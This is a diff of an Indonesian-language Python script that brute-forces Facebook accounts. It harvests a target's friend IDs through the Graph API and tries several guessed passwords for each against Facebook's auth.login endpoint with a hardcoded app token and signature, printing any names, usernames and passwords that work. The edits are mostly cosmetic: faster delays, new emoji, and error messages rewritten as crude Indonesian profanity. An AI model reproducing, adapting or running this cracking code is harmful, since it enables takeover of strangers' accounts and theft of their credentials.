@@ -14,7 +14,7 @@ br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 def keluar():
-	print ("{!} Keluar");time.sleep(0.07)
+	print ("{!} Keluar");time.sleep(0.01)
 	os.sys.exit()
 
 def acak(x):
@@ -61,9 +61,9 @@ id = []
 
 def tokenz():
 	os.system('clear')
-	print (logo);time.sleep(0.07)
+	print (logo);time.sleep(0.01)
 	print ("───────────────────────────────────────────");time.sleep(0.07)
-	toket = raw_input("{☆} Enter Token : ");time.sleep(0.07)
+	toket = raw_input("{☆} Enter Token : ");time.sleep(0.01)
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -71,15 +71,15 @@ def tokenz():
 		zedd = open("login.txt", 'w')
 		zedd.write(toket)
 		zedd.close()
-		jalan ('Login Berhasil...');time.sleep(0.07)
+		jalan ('Login Succes...');time.sleep(0.01)
 		menu()
 	except KeyError:
-		print ("{!} Token Salah");time.sleep(0.07)
+		print ("{!} Tokenlu Salah Kontol!");time.sleep(0.07)
 		os.system('rm -rf login.txt')
 		time.sleep(2)
 		tokenz()
 	except requests.exceptions.ConnectionError:
-		print ("{!} Tidak Ada Koneksi Internet");time.sleep(0.07)
+		print ("{!} Internet tolol");time.sleep(0.01)
 		keluar()
 
 def menu():
@@ -105,22 +105,22 @@ def menu():
 		print ("{!} Tidak Ada Koneksi Internet");time.sleep(0.07)
 		keluar()
 	os.system("clear")
-	print (logo);time.sleep(0.07)
+	print (logo);time.sleep(0.01)
 	print ("───────────────────────────────────────────");time.sleep(0.07)
-	jalan ("{☆} Nama : "+nama);time.sleep(0.07)
-	jalan ("{☆} Id   : "+id);time.sleep(0.07)
+	jalan ("{✪} Nama : "+nama);time.sleep(0.01)
+	jalan ("{✪} Id   : "+id);time.sleep(0.01)
 	print ("───────────────────────────────────────────");time.sleep(0.07)
-	print ("{01} Crack ID Indonesia");time.sleep(0.07)
-	print ("{02} Crack ID Buat Sandi");time.sleep(0.07)
-	print ("{03} Dumps ID Publik");time.sleep(0.07)
-	print ("{00} Keluar");time.sleep(0.07)
+	print ("{1} Crack Indonesia");time.sleep(0.01)
+	print ("{2} Crack Buat Sandi");time.sleep(0.01)
+	print ("{3} Dumps Publik");time.sleep(0.01)
+	print ("{0} Keluar");time.sleep(0.01)
 	print ("───────────────────────────────────────────");time.sleep(0.07)
 	pilih()
 
 def pilih():
-	unikers = raw_input("︻デ═一▸ ");time.sleep(0.07)
+	unikers = raw_input("︻デ═一▸ ");time.sleep(0.01)
 	if unikers =="":
-		print ("{!} Isi Yang Benar");time.sleep(0.07)
+		print ("{!} Salah Lo Kontol");time.sleep(0.01)
 		pilih()
 	elif unikers =="1" or unikers =="01":
 		crack_indo()
@@ -134,7 +134,7 @@ def pilih():
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print ("{!} Isi Yang Benar");time.sleep(0.07)
+		print ("{!} Salah Kontol");time.sleep(0.07)
 		pilih()
 
 def crack_indo():
@@ -150,32 +150,32 @@ def crack_indo():
 	os.system('clear')
 	print (logo);time.sleep(0.07)
 	print ("───────────────────────────────────────────");time.sleep(0.07)
-	print ("{01} Crack Id Publik");time.sleep(0.07)
-	print ("{02} Crack Dari File");time.sleep(0.07)
-	print ("{00} Kembali");time.sleep(0.07)
+	print ("{1} Crack Id Publik");time.sleep(0.01)
+	print ("{2} Crack Dari File");time.sleep(0.01)
+	print ("{0} Kembali");time.sleep(0.01)
 	print ("───────────────────────────────────────────");time.sleep(0.07)
 	pilih_indo()
 
 def pilih_indo():
-	teak = raw_input("︻デ═一▸ ");time.sleep(0.07)
+	teak = raw_input("︻デ═一▸ ");time.sleep(0.01)
 	if teak =="":
-		print ("{!} Isi Yang Benar");time.sleep(0.07)
+		print ("{!} Isi Yang Benar");time.sleep(0.01)
 		pilih_indo()
 	elif teak =="1" or teak =="01":
 		os.system('clear')
 		print (logo);time.sleep(0.07)
 		print ("───────────────────────────────────────────");time.sleep(0.07)
-		idt = raw_input("{☆} Enter ID : ");time.sleep(0.07)
+		idt = raw_input("{✪} Enter ID : ");time.sleep(0.01)
 		try:
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			sp = json.loads(pok.text)
-			print ("{☆} Nama : "+sp["name"]);time.sleep(0.07)
+			print ("{☆} Nama : "+sp["name"]);time.sleep(0.01)
 		except KeyError:
-			print ("{!} Id Tidak Ada");time.sleep(0.07)
-			raw_input("{Kembali}");time.sleep(0.07)
+			print ("{!} ID GA ADA KONTOL");time.sleep(0.01)
+			raw_input("{Kembali}");time.sleep(0.01)
 			crack_indo()
 		except requests.exceptions.ConnectionError:
-			print ("{!} Tidak Ada Koneksi Internet");time.sleep(0.07)
+			print ("{!} Internetlu Kek Pepek");time.sleep(0.01)
 			keluar()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -185,28 +185,28 @@ def pilih_indo():
 		os.system('clear')
 		print (logo);time.sleep(0.07)
 		try:
-			print ("───────────────────────────────────────────");time.sleep(0.07)
-			idlist = raw_input('{☆} Nama File : ');time.sleep(0.07)
+			print ("───────────────────────────────────────────");time.sleep(0.01)
+			idlist = raw_input('{✪} Nama File : ');time.sleep(0.01)
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
 		except KeyError:
-			print ('{!} File Tidak Ada');time.sleep(0.07)
-			raw_input("{Kembali}");time.sleep(0.07)
+			print ('{!} File Gaada Kontol');time.sleep(0.01)
+			raw_input("{Kembali}");time.sleep(0.01)
 			crack_indo()
 		except IOError:
-			print ('{!} File Tidak Ada');time.sleep(0.07)
-			raw_input("{Kembali}");time.sleep(0.07)
+			print ('{!} File Gaada Kontol');time.sleep(0.07)
+			raw_input("{Kembali}");time.sleep(0.01)
 			crack_indo()
 	elif teak =="0" or teak =="00":
 		menu()
 	else:
 		print ("{!} Isi Yang Benar");time.sleep(0.07)
 		pilih_indo()
-	print ("{☆} Total ID : ")+str(len(id));time.sleep(0.07)
-	print ('{☆} Stop Tekan CTRL+Z');time.sleep(0.07)
+	print ("{✪} Total ID : ")+str(len(id));time.sleep(0.07)
+	print ('{✪} Stop Tekan CTRL+Z');time.sleep(0.07)
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print ("\r{☆} Crack Berjalan"+o),;sys.stdout.flush();time.sleep(1)
+		print ("\r{✪} Crack Berjalan"+o),;sys.stdout.flush();time.sleep(1)
 	print ("\n───────────────────────────────────────────");time.sleep(0.07)
 
 	def main(arg):
@@ -223,7 +223,7 @@ def pilih_indo():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			ko = json.load(data)
 			if 'access_token' in ko:
-				print ("✔️ Berhasil");time.sleep(0.07)
+				print ("🤙 Berhasil");time.sleep(0.07)
 				print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 				print ("{!} User      : "+zowe);time.sleep(0.07)
 				print ("{!} Password  : "+bos1);time.sleep(0.07)
@@ -233,7 +233,7 @@ def pilih_indo():
 				oks.append(zowe)
 			else:
 				if 'www.facebook.com' in ko['error_msg']:
-					print ("❌ Cekpoint");time.sleep(0.07)
+					print ("😓 Cekpoint");time.sleep(0.07)
 					print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 					print ("{!} User      : "+zowe);time.sleep(0.07)
 					print ("{!} Password  : "+bos1);time.sleep(0.07)
@@ -246,7 +246,7 @@ def pilih_indo():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					ko = json.load(data)
 					if 'access_token' in ko:
-						print ("✔️ Berhasil");time.sleep(0.07)
+						print ("🤙 Berhasil");time.sleep(0.07)
 						print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 						print ("{!} User      : "+zowe);time.sleep(0.07)
 						print ("{!} Password  : "+bos2);time.sleep(0.07)
@@ -256,7 +256,7 @@ def pilih_indo():
 						oks.append(zowe)
 					else:
 						if 'www.facebook.com' in ko['error_msg']:
-							print ("❌ Cekpoint");time.sleep(0.07)
+							print ("😓 Cekpoint");time.sleep(0.07)
 							print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 							print ("{!} User      : "+zowe);time.sleep(0.07)
 							print ("{!} Password  : "+bos2);time.sleep(0.07)
@@ -269,7 +269,7 @@ def pilih_indo():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							ko = json.load(data)
 							if 'access_token' in ko:
-								print ("✔️ Berhasil");time.sleep(0.07)
+								print ("🤙 Berhasil");time.sleep(0.07)
 								print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 								print ("{!} User      : "+zowe);time.sleep(0.07)
 								print ("{!} Password  : "+bos3);time.sleep(0.07)
@@ -279,7 +279,7 @@ def pilih_indo():
 								oks.append(zowe)
 							else:
 								if 'www.facebook.com' in ko['error_msg']:
-									print ("❌ Cekpoint");time.sleep(0.07)
+									print ("😓 Cekpoint");time.sleep(0.07)
 									print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 									print ("{!} User      : "+zowe);time.sleep(0.07)
 									print ("{!} Password  : "+bos3);time.sleep(0.07)
@@ -292,7 +292,7 @@ def pilih_indo():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									ko = json.load(data)
 									if 'access_token' in ko:
-										print ("✔️ Berhasil");time.sleep(0.07)
+										print ("🤙 Berhasil");time.sleep(0.07)
 										print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 										print ("{!} User      : "+zowe);time.sleep(0.07)
 										print ("{!} Password  : "+bos4);time.sleep(0.07)
@@ -302,7 +302,7 @@ def pilih_indo():
 										oks.append(zowe)
 									else:
 										if 'www.facebook.com' in ko['error_msg']:
-											print ("❌ Cekpoint");time.sleep(0.07)
+											print ("😓 Cekpoint");time.sleep(0.07)
 											print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 											print ("{!} User      : "+zowe);time.sleep(0.07)
 											print ("{!} Password  : "+bos4);time.sleep(0.07)
@@ -315,7 +315,7 @@ def pilih_indo():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											ko = json.load(data)
 											if 'access_token' in ko:
-												print ("✔️ Berhasil");time.sleep(0.07)
+												print ("🤙 Berhasil");time.sleep(0.07)
 												print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 												print ("{!} User      : "+zowe);time.sleep(0.07)
 												print ("{!} Password  : "+bos5);time.sleep(0.07)
@@ -325,7 +325,7 @@ def pilih_indo():
 												oks.append(zowe)
 											else:
 												if 'www.facebook.com' in ko['error_msg']:
-													print ("❌ Cekpoint");time.sleep(0.07)
+													print ("😓 Cekpoint");time.sleep(0.07)
 													print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 													print ("{!} User      : "+zowe);time.sleep(0.07)
 													print ("{!} Password  : "+bos5);time.sleep(0.07)
@@ -338,7 +338,7 @@ def pilih_indo():
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													ko = json.load(data)
 													if 'access_token' in ko:
-														print ("✔️ Berhasil");time.sleep(0.07)
+														print ("🤙 Berhasil");time.sleep(0.07)
 														print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 														print ("{!} User      : "+zowe);time.sleep(0.07)
 														print ("{!} Password  : "+bos6);time.sleep(0.07)
@@ -348,7 +348,7 @@ def pilih_indo():
 														oks.append(zowe)
 													else:
 														if 'www.facebook.com' in ko['error_msg']:
-															print ("❌ Cekpoint");time.sleep(0.07)
+															print ("😓 Cekpoint");time.sleep(0.07)
 															print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 															print ("{!} User      : "+zowe);time.sleep(0.07)
 															print ("{!} Password  : "+bos6);time.sleep(0.07)
@@ -361,7 +361,7 @@ def pilih_indo():
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															ko = json.load(data)
 															if 'access_token' in ko:
-																print ("✔️ Berhasil");time.sleep(0.07)
+																print ("🤙 Berhasil");time.sleep(0.07)
 																print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 																print ("{!} User      : "+zowe);time.sleep(0.07)
 																print ("{!} Password  : "+bos7);time.sleep(0.07)
@@ -371,7 +371,7 @@ def pilih_indo():
 																oks.append(zowe)
 															else:
 																if 'www.facebook.com' in ko['error_msg']:
-																	print ("❌ Cekpoint");time.sleep(0.07)
+																	print ("😓 Cekpoint");time.sleep(0.07)
 																	print ("{!} Nama      : "+j['name']);time.sleep(0.07)
 																	print ("{!} User      : "+zowe);time.sleep(0.07)
 																	print ("{!} Password  : "+bos7);time.sleep(0.07)
@@ -403,9 +403,9 @@ def crack_sandi():
     os.system('clear')
     print (logo);time.sleep(0.07)
     print ("───────────────────────────────────────────");time.sleep(0.07)
-    print ('{01} Crack Id Publik');time.sleep(0.07)
-    print ('{02} Crack Dari File');time.sleep(0.07)
-    print ('{00} Kembali');time.sleep(0.07)
+    print ('{1} Crack Id Publik');time.sleep(0.07)
+    print ('{2} Crack Dari File');time.sleep(0.07)
+    print ('{0} Kembali');time.sleep(0.07)
     print ("───────────────────────────────────────────");time.sleep(0.07)
     pilih_sandi()
 
